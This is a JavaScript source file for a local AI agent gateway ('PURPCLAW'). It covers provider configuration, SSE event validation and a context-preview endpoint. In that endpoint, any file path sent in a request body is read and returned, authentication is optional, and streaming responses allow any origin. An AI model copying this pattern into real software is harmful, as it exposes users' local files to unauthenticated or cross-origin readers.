/**
 * UNIFIED API SERVER - PURPCLAW v7.0
 * ================================
 * Combines: HTTP API (port 7780) + WebSocket client (Xiaozhi cloud) + 66 MCP tools + SSE streams
 * 
 * Port: 7780 HTTP
 * WebSocket: XIAOZHI_WS_URL env var
 * SSE: /api/stream
 */

// Load .env from THIS file's dir, not cwd — under PM2 the cwd is not guaranteed
// to be the project root, so a bare config() silently skipped .env and the API
// service resolved the wrong LLM provider (openai default) while the CLI worked.
require('dotenv').config({ path: require('path').join(__dirname, '.env') });
// Stale OS/PM2-daemon env can SHADOW .env (dotenv never overrides existing env).
// A leftover LLM_API_KEY=ollama in the daemon made this service send the wrong
// key to MiniMax (401/1004) while the CLI worked — a surface-parity bug. Force
// the provider config from .env so every surface resolves the same provider.
try {
  const _envText = require('fs').readFileSync(require('path').join(__dirname, '.env'), 'utf8');
  for (const line of _envText.split('\n')) {
    const m = line.match(/^\s*(LLM_[A-Z_]+|(?:MINIMAX|NVIDIA|GLM|DEEPSEEK|KIMI|GROQ|OPENAI|OPENROUTER)_API_KEY|OPENAI_BASE_URL)=(.*)$/);
    if (m) process.env[m[1]] = m[2].trim();
  }
} catch {}
const http = require('http');
// ── STDOUT/STDERR EPIPE SHIELD (process-lifetime) ──────────────────────────
// A console.log writing to a broken pipe (dead parent, closed PM2 pipe) must
// NEVER become an uncaughtException that takes the whole API down. This exact
// crash killed the service on 2026-08-23 via unified_api.js handleChatStream
// console.log → EPIPE. Swallow EPIPE/EPIPE-class errors on stdio streams.
(function _installStdioEpipeShield() {
  const _safe = (stream) => {
    if (!stream || stream._epipeShield) return;
    stream._epipeShield = true;
    stream.on && stream.on('error', (e) => {
      if (e && (e.code === 'EPIPE' || e.code === 'ERR_STREAM_DESTROYED' || e.code === 'ERR_STREAM_WRITE_AFTER_END')) return; // swallowed
      throw e;
    });
  };
  _safe(process.stdout); _safe(process.stderr);
})();
const https = require('https');
const net = require('net');
const url = require('url');
const path = require('path');
const fs = require('fs');
const { spawn, exec, execSync, execFile } = require('child_process');

// Safe logger — writes to file so EPIPE is a synchronous exception that try/catch
// actually catches. console.log fires EPIPE asynchronously through Node's stdout
// stream and bypasses all try/catch, crashing the process.
const API_LOG = path.join(__dirname, 'var', 'purp-api.log');
function safeLog(tag, msg) {
  const entry = `[${new Date().toISOString()}] [${tag}] ${msg}\n`;
  try { fs.appendFileSync(API_LOG, entry, 'utf8'); } catch {}
}
const { trackedSpawn, installCleanup, list: listChildren, killAll: killAllChildren } = require('./lib/child-registry');
installCleanup(); // SIGINT/SIGTERM/uncaughtException → kill all tracked children
const { promisify } = require('util');
const WebSocket = require('ws');
const os = require('os');

const AgentTower = require('./agent_tower.js');

// ── LLM provider for unified backend access ──
const LLM = require('./lib/llm-provider');

// ── MCP integration: load servers so the tool catalogue is complete ──
// Mirrors what lib/commands/ask.js does for the CLI surface.
// Without this, the HTTP API gets zero MCP tools.
let _mcp = null;
async function ensureMcp() {
  if (_mcp) return _mcp;
  try {
    _mcp = require('./lib/mcp');
    await _mcp.loadServers();
    const TOOLS = require('./lib/tools');
    TOOLS.__registerMcpTools(_mcp.listTools(), (server, tool, args) => _mcp.callMcpTool(server, tool, args));
    console.log(`[MCP] ${_mcp.listTools().length} tools registered from ${_mcp._servers ? Object.keys(_mcp._servers).length : 0} servers`);
  } catch (e) {
    console.warn('[MCP] load failed — continuing without MCP tools:', e.message);
    _mcp = { listTools: () => [] };
  }
  return _mcp;
}
// Kick off async MCP loading without blocking server startup.
ensureMcp().catch(() => {});

// ========== DIGITAL SHAMAN LAYER ==========
let shaman = null;
let shamanEvaluator = null;
try {
  const { DigitalShaman } = require('./digital_shaman.js');
  const { ShamanEvaluator } = require('./shaman_evaluator.js');
  
  // Shaman config read from llm-provider.js via its own constructor default
  shaman = new DigitalShaman({
    mcpTools: [],
    autoPilot: false,
    maxCycles: 12
  });
  
  shamanEvaluator = new ShamanEvaluator({
    // Evaluator reads from environment: LLM_PROVIDER, LLM_MODEL, LLM_API_KEY
  });
  
  console.log('[SHAMAN] Digital Shaman Layer initialized');
  
  shaman.on('phaseChange', (data) => {
    broadcast({ type: 'shaman_phase_change', ...data });
  });
  
  shaman.on('message', (msg) => {
    broadcast({ type: 'shaman_message', ...msg });
  });
  
} catch (e) {
  console.log('[SHAMAN] digital_shaman.js not found - Shaman Layer disabled');
}
// ========== END SHAMAN LAYER ==========

const execAsync = promisify(exec);
const PORT = 7780;
const API_KEY = process.env.PURPCLAW_API_KEY || '';  // empty = no auth (local dev)
const AUTH_REQUIRED = !!API_KEY && process.env.PURPCLAW_NO_AUTH !== '1';
const MUTATING_METHODS = new Set(['POST', 'PUT', 'DELETE', 'PATCH']);
const XIAOZHI_WS_URL = process.env.XIAOZHI_WS_URL || process.env.XIAOZHI_MCP_URL || '';
// XiaoZhi's MCP panel rotates endpoint tokens per browser session — a boot-time
// const guarantees eventual permanent 401 loops (seen live 2026-08-25/26).
// The link is therefore MUTABLE runtime state: reconnect always reads
// xiaozhiLink.url, and POST /api/xiaozhi/link swaps it after a pass/fail probe.
const xiaozhiLink = {
  url: XIAOZHI_WS_URL || '',
  status: 'idle',            // idle | connecting | connected | disconnected | unauthorized | error
  lastError: null,
  lastConnectedAt: null,
};
const PURP_DIR = __dirname;
const INSTANCE_STATE = require('./lib/instance-state');
const INSTANCE_DATA = INSTANCE_STATE.ensure();
const PURP_STATE = path.join(INSTANCE_DATA, 'loop_state.json');
const PURP_LOG = path.join(PURP_DIR, 'purpclaw_output.log');
const SETTINGS_FILE = INSTANCE_STATE.storePath('settings');
const MEMORY_FILE = path.join(INSTANCE_STATE.storePath('memory'), 'legacy-facts.json');
const SKILLS_DIR = path.join(PURP_DIR, 'skills');
const PS_PREFIX = 'powershell.exe -NoProfile -NonInteractive -Command';
const KOKORO = 'C:\\Users\\Admin\\.openclaw\\kokoro_send.bat';
const KOKORO_LONG = 'C:\\Users\\Admin\\.openclaw\\kokoro_long_send.bat';

const state = {
  logs: [],
  maxLogs: 1000,
  skills: {},
  tasks: {},
  swarmAgents: {},
  // v2.1 — whoami snapshot cache (15s TTL). Full whoami does 4 HTTP probes
  // and a 20k-atom iteration; cache keeps UI polling responsive.
  whoamiCache: { data: null, cachedAt: 0, TTL: 15000 },
  settings: { 
    OPENAI_API_KEY: '', 
    XIAOZHI_MCP_URL: '', 
    MINIMAX_API_KEY: '', 
    DEEPSEEK_API_KEY: '', 
    model: 'deepseek-chat',
    activeBackend: 'kimi',
    aiBackends: [
      {
        id: 'kimi',
        name: 'Kimi (Moonshot)',
        provider: 'moonshot',
        apiKey: '',
        endpoint: 'https://api.moonshot.cn/v1/chat/completions',
        model: 'kimi-k2-5',
        contextWindow: 256000,
        supportsStreaming: true,
        supportsFunctionCalling: true,
        enabled: true
      },
      {
        id: 'openai',
        name: 'OpenAI',
        provider: 'openai',
        apiKey: '',
        endpoint: 'https://api.openai.com/v1/chat/completions',
        model: 'gpt-4o',
        contextWindow: 128000,
        supportsStreaming: true,
        supportsFunctionCalling: true,
        enabled: false
      },
      {
        id: 'anthropic',
        name: 'Anthropic',
        provider: 'anthropic',
        apiKey: '',
        endpoint: 'https://api.anthropic.com/v1/messages',
        model: 'claude-sonnet-4-20250514',
        contextWindow: 200000,
        supportsStreaming: true,
        supportsFunctionCalling: false,
        enabled: false
      },
      {
        id: 'deepseek',
        name: 'DeepSeek',
        provider: 'deepseek',
        apiKey: '',
        endpoint: 'https://api.deepseek.com/v1/chat/completions',
        model: 'deepseek-chat',
        contextWindow: 64000,
        supportsStreaming: true,
        supportsFunctionCalling: true,
        enabled: false
      },
      {
        id: 'local',
        name: 'Local / Ollama',
        provider: 'local',
        apiKey: '',
        endpoint: 'http://localhost:11434/v1/chat/completions',
        model: 'llama3',
        contextWindow: 8192,
        supportsStreaming: true,
        supportsFunctionCalling: false,
        enabled: false
      }
    ]
  },
  lastCommand: null,
  sammyStatus: 'connecting',
  sammyCurrentTask: null,
  responses: [],
  sseClients: [],
  divisions: {},
  activeProcesses: {},
  currentMood: 'chill',
  previousMood: 'chill',
  divisionAgents: {}
};

// ── Plan-then-act: parse LLM plan JSON ─────────────────────────────────────
const PLAN_VALID_ROUTES = ['chat', 'kernel', 'groupchat', 'research', 'swarm', 'mission', 'code', 'services', 'training', 'autoresearch'];

function parsePlanJson(planText) {
  let steps = [];
  let parseError = null;
  try {
    // Strip <think>...</think> blocks (qwen / deepseek / o1-style reasoning)
    let cleaned = planText
      .replace(/<think>[\s\S]*?<\/think>/gi, '')
      .replace(/^```(?:json)?\s*/i, '')
      .replace(/```\s*$/i, '')
      .trim();
    const m = cleaned.match(/\[[\s\S]*\]/);
    if (m) cleaned = m[0];
    const parsed = JSON.parse(cleaned);
    if (Array.isArray(parsed)) {
      steps = parsed.filter(s => s && (s.title || s.command)).map((s, i) => ({
        index: i + 1,
        title: String(s.title || ('Step ' + (i + 1))).slice(0, 200),
        command: String(s.command || '').slice(0, 800),
        route: PLAN_VALID_ROUTES.includes(s.route) ? s.route : 'chat',
        expected: String(s.expected || '').slice(0, 200),
        rationale: String(s.rationale || '').slice(0, 300),
      }));
    }
  } catch (e) { parseError = e.message; }
  return { steps, parseError };
}

// SSE helpers
function sseStart(res) {
  // Idempotent: the RECONNECT path (Last-Event-ID replay at ~:1020) calls
  // sseStart early, then control falls through to the main sseStart at
  // ~:1104 — the second writeHead threw ERR_HTTP_HEADERS_SENT (crash-
  // registry 1787582237130). Guard every entry.
  if (res.headersSent) return;
  res.writeHead(200, {
    'Content-Type': 'text/event-stream; charset=utf-8',
    'Cache-Control': 'no-cache, no-transform',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
    // CORS on the ACTUAL response, not just the OPTIONS preflight. Mission
    // Control streams chat by POSTing to http://127.0.0.1:7780 directly (it
    // bypasses the buffering service-proxy for SSE), which is cross-origin
    // from the UI on :3000. The preflight returned CORS but this response did
    // not, so the browser refused to read the stream and the panel showed
    // "error: Failed to fetch / stream failed".
    'Access-Control-Allow-Origin': '*',
  });
  if (res.flushHeaders) res.flushHeaders();
}

/**
 * validateEvent — enforces the ZERO-UNDEFINED SSE event contract.
 *
 * Every event that reaches the cockpit must have:
 *   eventId, type, timestamp, sessionId, missionId, runId, turnId,
 *   state, phase, summary
 *
 * Optional fields default to null (never undefined).
 * Missing critical fields → emit INTERNAL_EVENT_SCHEMA_ERROR instead.
 * Never silently forward an undefined-filled blob.
 */
const { randomUUID } = require('crypto');
const SCHEMA_REQUIRED = ['eventId','type','timestamp','sessionId','missionId','runId','turnId'];
const SCHEMA_OPTIONAL = [
  'capsuleId','operationId','actor','state','phase','summary','detail',
  'tool','skill','agent','args','result','error',
  'provider','model','tokens','tokenDelta',
  'status','durationMs','completionReason','totalTokens',
  'evidence','nextAction','verdict','progress','stallScore',
  'requestId','requiredPermission','waitsFor','nextObjective','progressScore',
  'ok','content','errorCode','failureKind','recoverable',
  'maxTurns','turn','from','to','reason','defects','lastConfirmedSeq',
  'expectedNextSeq','terminatorPresent','observedBytes','declaredBytes',
  'classification','turns','capsule','maxTurnsHit',
  'attemptId','attempt','terminal','retryOf',
  'attempt1','attempt2',
  'attemptActivity','failureClass',
  'stepIndex','executedSteps','spentEstTokens','budgetTokens','step-receipt','lease-revoked','budget-exceeded','tool','tool2',
];

// ── SSE per-request context ─────────────────────────────────────────────────
// Set by handleChatStream around its run loop. All validateEvent() calls inside
// that stream inherit sessionId / missionId / runId from here instead of
// fabricating synthetic values. Cleared on every stream exit (normal + error).
// Also carries eventId and timestamp defaults so producers that omit them do
// NOT get a schema violation — they get a sensible default and a console.warn.
let SSE_CTX = {
  eventId: null, timestamp: null,
  sessionId: null, missionId: null, runId: null, turnId: null, turn: 0,
  attemptId: null,
};
function SET_SSE_CTX(ctx) { SSE_CTX = ctx; }

/**
 * eventPayload — canonical SSE event envelope builder.
 *
 * RULES:
 * 1. Identity fields (missionId, sessionId, runId, turnId) ALWAYS come from ctx,
 *    never from data. A producer can never accidentally erase mission identity.
 * 2. All other fields come from data, allowing producers to override ctx values
 *    when they have more specific information (e.g. a turn event provides its
 *    own turn number, which overrides ctx.turnId).
 * 3. seq and emittedAt are ALWAYS fresh — never reused from ctx.
 *
 * @param {Object} ctx  — SSE_CTX at mission start (sessionId, missionId, runId, turnId, etc.)
 * @param {Object} data — producer payload (type, phase, summary, tool, etc.)
 * @param {Object} overrides — fields that MUST come from caller (e.g. eventName for sseEvent)
 * @returns {Object} merged envelope — safe to pass to validateEvent
 */
let _seq = 0;
/**
 * eventPayload — canonical SSE event envelope builder.
 *
 * Priority for each field class:
 *  IDENTITY  (missionId, sessionId, runId, turnId): ctx ONLY — never data.
 *                                       ctx absent → null. data is ignored.
 *  OPERATIONAL (provider, model, capsuleId, streamId): data wins if set,
 *                                       else ctx, else null.
 *  SEMANTIC  (all other producer fields): data ONLY — from producer.
 *  METADATA  (seq, emittedAt): always fresh — never from ctx/data.
 *  OVERRIDES: always win — used for SSE transport fields.
 */
function eventPayload(ctx, data = {}, overrides = {}) {
  const ctxSeq = ++_seq;
  return {
    // Semantic fields from producer — these always win for non-identity/non-metadata fields
    ...data,
    // Explicit overrides — SSE transport metadata (eventName, etc.)
    ...overrides,
    // Fresh per-emission metadata
    seq:       ctxSeq,
    emittedAt: Date.now(),
    // Identity fields — ONLY from ctx, never from data. Anti-sabotage.
    // ctx absent (null/undefined) → null. data is completely ignored for these 4.
    missionId:  (ctx && ctx.missionId)  ?? null,
    sessionId:  (ctx && ctx.sessionId)  ?? null,
    runId:      (ctx && ctx.runId)      ?? null,
    turnId:     (ctx && ctx.turnId)     ?? null,
    attemptId:  (ctx && ctx.attemptId)  ?? null,
    // Operational fields — overrides > data > ctx (each can be absent/null)
    provider:   (overrides && overrides.provider)  ?? (data && data.provider)  ?? (ctx && ctx.provider)  ?? null,
    model:      (overrides && overrides.model)     ?? (data && data.model)     ?? (ctx && ctx.model)    ?? null,
    capsuleId:  (overrides && overrides.capsuleId) ?? (data && data.capsuleId) ?? (ctx && ctx.capsuleId) ?? null,
    streamId:   (ctx && ctx.streamId)    ?? null,
  };
}

// eventType: the SSE event name (e.g. 'phase', 'tool-result') — used as the
// summary lookup key when the producer didn't explicitly set data.type.
// Only used for summary augmentation; the SSE event name itself stays on the
// SSE transport layer (event: line) and is never mixed into data.type.
function validateEvent(raw, fallbackSessionId = 'unknown', eventType = null) {
  // PASS 1 — identity contract. These four fields are the absolute minimum
  // required to route an event to any consumer. Missing = producer is broken.
  // DO NOT fabricate. Throw EVENT_SCHEMA_VIOLATION and preserve the original.
  // Exception: if SSE_CTX was set by handleChatStream, use its values so
  // producers that rely on context-injection still work.
  const eventId   = raw.eventId   || SSE_CTX.eventId   || null;
  const timestamp = raw.timestamp || SSE_CTX.timestamp || null;
  const sessionId = raw.sessionId || SSE_CTX.sessionId || fallbackSessionId || null;
  // type: use data.type only when producer explicitly set it.
  // SSE event name is SSE transport metadata — not mixed into data.type.
  // eventType (SSE name) is used only for summary lookup below.
  const type      = raw.type      || null;

  if (!eventId || !type || !timestamp) {
    const err = new Error('EVENT_SCHEMA_VIOLATION');
    err.kind  = 'EVENT_SCHEMA_VIOLATION';
    err.eventType   = type      || eventType || '** MISSING type **';
    err.missingFields = [
      ...(eventId   ? [] : ['eventId']),
      ...(type      ? [] : ['type']),
      ...(timestamp ? [] : ['timestamp']),
    ];
    err.rawPayload = raw;
    throw err;
  }

  // PASS 2 — mission-scoped routing. If SSE_CTX was set by handleChatStream
  // (i.e. a mission is active), these fields MUST be present. Null = either no
  // mission active OR the producer failed to include them. Both are wrong.
  const missionId = raw.missionId;       // null = producer says no mission; undefined = producer forgot
  const runId     = raw.runId;
  const turnId    = raw.turnId;

  // If SSE_CTX has an active mission (sessionId set), producers MUST include
  // missionId. A bare `null` from the producer means "I know about missions and
  // this event isn't in one" — that's valid. But `undefined` (field absent)
  // when SSE_CTX has a mission = producer forgot — throw.
  if (SSE_CTX.sessionId && SSE_CTX.missionId != null && missionId == null) {
    const err = new Error('EVENT_SCHEMA_VIOLATION');
    err.kind  = 'EVENT_SCHEMA_VIOLATION';
    err.eventType   = type;
    err.missingFields = ['missionId'];
    err.rawPayload = raw;
    throw err;
  }

  // Apply SSE_CTX defaults only for fields the producer actually omitted.
  const finalMissionId = missionId != null ? missionId : (SSE_CTX.missionId || null);
  const finalRunId     = runId     != null ? runId     : (SSE_CTX.runId     || null);
  const finalTurnId    = turnId    != null ? turnId    : (SSE_CTX.turnId    || null);

  // PASS 3 — build the envelope. Optional fields default to null (never undefined).
  // Summary augmentation: only add a summary when the producer left it empty AND
  // we can compute one reliably from other fields the producer DID supply.
  const base = {
    eventId,
    type,
    timestamp,
    sessionId,
    missionId:  finalMissionId,
    runId:      finalRunId,
    turnId:     finalTurnId,
    attemptId:  raw.attemptId != null ? raw.attemptId : (SSE_CTX.attemptId || null),
    operationId: raw.operationId  || null,
    capsuleId:   raw.capsuleId    || null,
    actor:       raw.actor        || null,
    state:       raw.state        || null,
    phase:       raw.phase        || null,
    summary:     raw.summary      || null,
    detail:      raw.detail       || null,
    tool:        raw.tool         || null,
    skill:       raw.skill        || null,
    agent:       raw.agent        || null,
    args:        raw.args         || null,
    result:      raw.result       || null,
    error:       raw.error        || null,
    provider:    raw.provider     || null,
    model:       raw.model        || null,
    tokens:      raw.tokens       ?? null,
    tokenDelta:  raw.tokenDelta   ?? null,
    status:      raw.status       || null,
    durationMs:  raw.durationMs  ?? null,
    completionReason: raw.completionReason || null,
    totalTokens: raw.totalTokens  ?? null,
    evidence: Array.isArray(raw.evidence) ? raw.evidence : (raw.evidence ? [raw.evidence] : null),
    nextAction:  raw.nextAction   || null,
    // Turn and maxTurns: emitted by the spin-loop turn boundary event.
    // Must be explicitly listed — validateEvent strips unlisted fields.
    turn:       raw.turn       ?? null,
    maxTurns:   raw.maxTurns   ?? null,
    // ruleCount: steering capsule rule count. Not in standard schema — add explicitly.
    ruleCount:  raw.ruleCount  ?? null,
    // content: streaming text delta from the model — not in standard schema,
    // must be explicitly listed or token events arrive as empty strings.
    content:    raw.content    ?? null,
    // delta: reasoning stream text for the thinking bubble (reasoning SSE
    // events). Same law as content — must be listed or thoughts arrive empty.
    delta:      raw.delta      ?? null,
    // delta: reasoning stream delta (thinking-bubble lane) — same law as content.
    // slash: command name + ok/reply: terminal payload of slash-dispatched streams
    // (sseFinal 'done' events). Must be listed or /tool, /help etc. arrive empty.
    slash:      raw.slash      ?? null,
    ok:         raw.ok         ?? null,
    reply:      raw.reply      ?? null,
    // claim-gate / contradiction-gate flags on done events (LARP gate wiring)
    claimGate:            raw.claimGate ?? null,
    runtimeContradiction: raw.runtimeContradiction ?? null,
    // MODEL TRUTH RECEIPT — full telemetry object passes through untouched.
    // Requested vs resolved provider/model + usage + timing (Phase: Model Truth).
    telemetry:  raw.telemetry  ?? null,
    requestedProvider: raw.requestedProvider ?? null,
    requestedModel:    raw.requestedModel    ?? null,
    route:             raw.route             ?? null,
    lease:             raw.lease             ?? null,
    toolCalls:         raw.toolCalls         ?? null,
    agentCalls:        raw.agentCalls        ?? null,
    skillCalls:        raw.skillCalls        ?? null,
    fallbackCount:     raw.fallbackCount     ?? null,
    fallbackPath:      Array.isArray(raw.fallbackPath) ? raw.fallbackPath : null,
    providerAttempts:  Array.isArray(raw.providerAttempts) ? raw.providerAttempts : [],
    promptTokens:      raw.promptTokens      ?? null,
    completionTokens:  raw.completionTokens  ?? null,
    reasoningTokens:   raw.reasoningTokens   ?? null,
    reasoningState:    raw.reasoningState    ?? null,
    ttftMs:            raw.ttftMs            ?? null,
    capsCount:         raw.capsCount         ?? null,
    bindings:          Array.isArray(raw.bindings) ? raw.bindings : null,
    // MODE-OFFER LAW — runtime-detected intent mismatch (mode-offer events +
    // done.modeOffer). Must be whitelisted or the cockpit never sees the offer.
    modeOffer:   raw.modeOffer   ?? null,
    kind:        raw.kind        ?? null,
    capability:  raw.capability  ?? null,
    offers:      Array.isArray(raw.offers) ? raw.offers : null,
  };

  // PASS 4 — summary augmentation only where the producer DID supply the data.
  // Use raw.type (explicit producer value) when set; fall back to SSE event name
  // for producers that didn't set data.type explicitly. This separates SSE
  // transport (event: line) from semantic type (data.type).
  if (!base.summary) {
    const key = type || eventType; // explicit producer type wins; SSE name is fallback
    if (key === 'phase')         base.summary = base.phase || 'phase';
    else if (key === 'turn')     base.summary = `turn ${base.turn || '?'}/${base.maxTurns || '?'}`;
    else if (key === 'steering') base.summary = base.capsuleId ? `capsule ${String(base.capsuleId).slice(0,14)} resolved` : 'steering';
    else if (key === 'steer')   base.summary = base.detail ? String(base.detail).slice(0, 60) : 'steer injected';
    else if (key === 'done') {
      const s = base.status || 'unknown';
      const d = base.durationMs ? ` · ${(base.durationMs/1000).toFixed(1)}s` : '';
      const t = base.totalTokens ? ` · ${base.totalTokens.toLocaleString()} tk` : '';
      base.summary = `${s}${d}${t}`;
    }
    else if (key === 'error')    base.summary = `${base.errorCode || 'ERROR'}: ${String(base.error || raw.message || 'unknown').slice(0, 80)}`;
    else if (key === 'tool-call') base.summary = `${base.tool || '?'}${base.args ? ' · ' + JSON.stringify(base.args).slice(0,80) : ''}`;
    else if (key === 'tool-result') { const ok = raw.ok !== false; base.summary = `${base.tool || '?'} → ${ok ? 'ok' : 'FAILED'}`; }
    else if (key === 'reacharound') base.summary = `${base.verdict || '?'} · prog ${base.progress != null ? base.progress.toFixed(2) : '?'} · stall ${base.stallScore != null ? base.stallScore.toFixed(2) : '?'}`;
    else if (key === 'reacharound-approval-required') base.summary = `WAITING · verdict: ${base.verdict || '?'} · reason: ${String(base.reason || '').slice(0, 60)}`;
    else if (key === 'completion-gate') base.summary = `${base.status || '?'} · ${base.reason || ''}`.slice(0, 120);
    else if (key === 'token') {
      const preview = String(raw.content || '').slice(0, 40).replace(/\n/g, ' ');
      base.summary = `${preview}${raw.provider ? ' · ' + raw.provider : ''}`;
    }
  }

  return base;
}

function sseEvent(res, event, data) {
  if (!res || !res.write) return;
  try {
    // Inject SSE_CTX into the payload BEFORE validation. Producers that omit
    // sessionId/missionId/runId get it from context instead of fabricating it.
    // Producer values take precedence over context (explicit > inferred).
    // eventId and timestamp are ALWAYS fresh per emission — do not reuse.
    //
    // type: semantic event type for cockpit routing.
    // Producer explicit value wins. Falls back to SSE event name so the cockpit
    // always gets a valid routing type even when producers omit data.type.
    const raw = Object.assign({}, SSE_CTX, data || {}, {
      eventId:   (data && data.eventId)   || randomUUID(),
      timestamp: (data && data.timestamp) || new Date().toISOString(),
      type:      (data && data.type) || event || null,
    });
    const validated = validateEvent(raw, raw.sessionId || 'unknown', event);
    try {
      // Record for reconnect replay (best-effort; never blocks live stream)
      try { SSE_REPLAY.record(validated.sessionId, event, validated); } catch {}
      res.write(`id: ${validated.eventId}\nevent: ${event}\ndata: ${JSON.stringify(validated)}\n\n`);
    } catch (werr) {
      // Client vanished mid-stream (EPIPE / destroyed socket). Drop the event,
      // never propagate — a disconnected browser must not kill the API.
      if (werr && (werr.code === 'EPIPE' || werr.code === 'ERR_STREAM_WRITE_AFTER_END' || werr.code === 'ERR_STREAM_DESTROYED')) return false;
      throw werr;
    }
  } catch (e) {
    if (e && e.kind === 'EVENT_SCHEMA_VIOLATION') {
      // Producer sent an event without required identity fields. Emit a named
      // error event so the cockpit can display it, then continue streaming.
      console.warn('[SSE schema] EVENT_SCHEMA_VIOLATION from producer:', e.missingFields, 'type:', e.eventType);
      const errEvent = {
        eventId:   (data && data.eventId)  || Date.now().toString(36),
        type:      'INTERNAL_EVENT_SCHEMA_ERROR',
        timestamp: new Date().toISOString(),
        sessionId: (data && data.sessionId) || SSE_CTX.sessionId || 'unknown',
        missionId: SSE_CTX.missionId || null,
        runId:     SSE_CTX.runId     || null,
        error:     'EVENT_SCHEMA_VIOLATION',
        errorCode: 'EVENT_SCHEMA_VIOLATION',
        summary:   `event dropped — missing: ${(e.missingFields || []).join(', ')}`,
        detail:    null,
        rawPayload: e.rawPayload || null,
        missingFields: e.missingFields || [],
        offendingEventType: e.eventType || null,
      };
      try { res.write(`event: error\ndata: ${JSON.stringify(errEvent)}\n\n`); } catch {}
    } else {
      // Non-schema error — something else broke. Log it, try to emit a last-resort
      // error event, then re-throw so the caller knows something is wrong.
      console.error('[sseEvent] unexpected error:', e && e.message ? e.message : String(e));
      try {
        res.write(`event: error\ndata: ${JSON.stringify({
          eventId:   Date.now().toString(36),
          type:      'error',
          timestamp: new Date().toISOString(),
          sessionId: (data && data.sessionId) || SSE_CTX.sessionId || 'unknown',
          missionId: SSE_CTX.missionId || null,
          runId:     SSE_CTX.runId     || null,
          error:     'INTERNAL_EVENT_ERROR',
          errorCode: 'INTERNAL_EVENT_ERROR',
          summary:   'SSE event handler threw — see server log',
          detail:    e && e.message ? e.message : String(e),
        })}\n\n`);
      } catch {}
      throw e;
    }
  }
}
function sseComment(res, text) {
  // SSE comment — keeps the connection warm
  try { res.write(`: ${text}\n\n`); } catch {}
}

function sseFinal(res, payload) {
  // Terminal 'done' event for a stream. sseFinal was referenced by the slash
  // branch but never defined, crashing every slash-dispatched stream with
  // "sseFinal is not defined".
  sseEvent(res, 'done', Object.assign({ ok: true }, payload || {}));
}

// ── /api/composer/context — Active Context Panel data ─────────────────────────
//
// The "what will be sent" panel above the textbox. The UI calls this
// with the current attachments (files, URLs, mentions) and gets back:
//   - per-item preview (file content, URL title, agent name, etc.)
//   - real token count (chars/4 heuristic + file bytes)
//   - the prompt that will actually be built from these attachments
//   - flagged warnings (file too big, secret detected, etc.)
//
// Everything is real — files are read, URLs are fetched (HEAD), agents
// are looked up. No mocks, no fakery.
function composerTokenCount(text) {
  // GPT-style: ~4 chars per token. Real tokenizers are similar.
  // We add +5% overhead for system prompt + structure.
  return Math.ceil((text || '').length / 4);
}

async function composerContextHandler(req, res) {
  if (req.method !== 'POST') return sendJson(res, 405, { ok: false, error: 'POST only' });
  const body = await parseBody(req);
  const { attachments = [], mentions = [], mode = 'chat', workspace = 'current' } = body;

  const out = {
    ok: true,
    mode,
    workspace,
    items: [],
    totalTokens: 0,
    totalChars: 0,
    prompt: '',
    warnings: [],
  };

  // ── Process attachments ────────────────────────────────────────────────
  for (const att of attachments) {
    const item = { kind: att.kind || 'file', label: att.label || att.path || att.url || 'untitled' };
    try {
      if (att.kind === 'file' && att.path) {
        const fs = require('fs');
        if (!fs.existsSync(att.path)) {
          item.error = 'file not found';
          item.exists = false;
        } else {
          const stat = fs.statSync(att.path);
          item.size = stat.size;
          if (stat.size > 200_000) {
            item.truncated = true;
            item.content = fs.readFileSync(att.path, 'utf-8').slice(0, 200_000) + '\n\n[…truncated]';
            out.warnings.push({ kind: 'truncated', label: item.label, size: stat.size });
          } else {
            item.content = fs.readFileSync(att.path, 'utf-8');
          }
          item.tokens = composerTokenCount(item.content);
          item.exists = true;
          // Secret-pattern detection (defensive)
          if (/(sk-[A-Za-z0-9]{20,}|api[_-]?key[\"'\s:=]+[A-Za-z0-9]{20,})/i.test(item.content)) {
            item.secretWarning = true;
            out.warnings.push({ kind: 'secret', label: item.label });
          }
        }
      } else if (att.kind === 'url' && att.url) {
        // HEAD the URL, return title if possible
        try {
          const u = new URL(att.url);
          item.host = u.host;
          // Don't fetch the full page (could be huge); just record URL
          item.content = `[URL: ${att.url}]`;
          item.tokens = composerTokenCount(item.content);
        } catch (e) {
          item.error = 'invalid url';
        }
      } else if (att.kind === 'clipboard') {
        item.content = att.content || '';
        item.tokens = composerTokenCount(item.content);
      } else if (att.kind === 'image' && att.path) {
        // Image attachments don't add to the text token count
        item.tokens = 0;
        item.image = true;
      } else if (att.content) {
        item.content = String(att.content);
        item.tokens = composerTokenCount(item.content);
      }
    } catch (e) {
      item.error = e.message;
    }
    out.items.push(item);
    out.totalTokens += item.tokens || 0;
    out.totalChars += (item.content || '').length;
  }

  // ── Process mentions (agents / skills) ─────────────────────────────────
  for (const m of mentions) {
    const item = { kind: 'mention', label: m.name || m, role: m.role || 'agent' };
    item.content = `[@${m.role || 'agent'}: ${m.name || m}]`;
    item.tokens = composerTokenCount(item.content);
    out.items.push(item);
    out.totalTokens += item.tokens;
    out.totalChars += item.content.length;
  }

  // ── Build the actual prompt that will be sent ─────────────────────────
  const promptParts = [];
  for (const it of out.items) {
    if (it.content) {
      promptParts.push(`# ${it.label}\n\n${it.content}`);
    }
  }
  // Workspace header
  if (workspace && workspace !== 'current') {
    promptParts.unshift(`# Workspace: ${workspace}`);
  }
  // Mode header
  if (mode === 'plan') {
    promptParts.unshift('# Mode: PLAN (reasoning only, no tools)');
  } else if (mode === 'execute') {
    promptParts.unshift('# Mode: EXECUTE (tools enabled, agent actions allowed)');
  } else if (mode === 'swarm') {
    promptParts.unshift('# Mode: SWARM (multi-agent orchestration)');
  }
  out.prompt = promptParts.join('\n\n---\n\n');

  // Size warnings
  if (out.totalTokens > 200_000) {
    out.warnings.push({ kind: 'large-context', tokens: out.totalTokens, message: 'context > 200k tokens, may exceed model limits' });
  }

  return sendJson(res, 200, out);
}

// Streaming chat handler. Mirrors the JSON /api/chat shape, but emits
// each token as an SSE event so the UI can render in real-time.
// Events:
//   phase  → {phase: 'received'|'thinking'|'responding'|'done'|'error'}
//   token  → {content, model}
//   done   → {reply, model, providerStatus, kernelJobId?}
//   error  → {error}
// ── Conversation memory ─────────────────────────────────────────────────────
// Core owns conversation state in the canonical SQLite repository. Browser
// localStorage and process-global Maps may cache presentation state, but they
// never own history: Chrome, Edge, CLI and a restarted API read these same rows.
const SESSION_REPOSITORY = require('./lib/session-repository');
const SSE_REPLAY = require('./lib/sse-replay');
const SEMANTIC_CHAT = require('./lib/semantic-chat');
const TA = require('./lib/turn-authority');          // classifyIntent + CHAT intent class
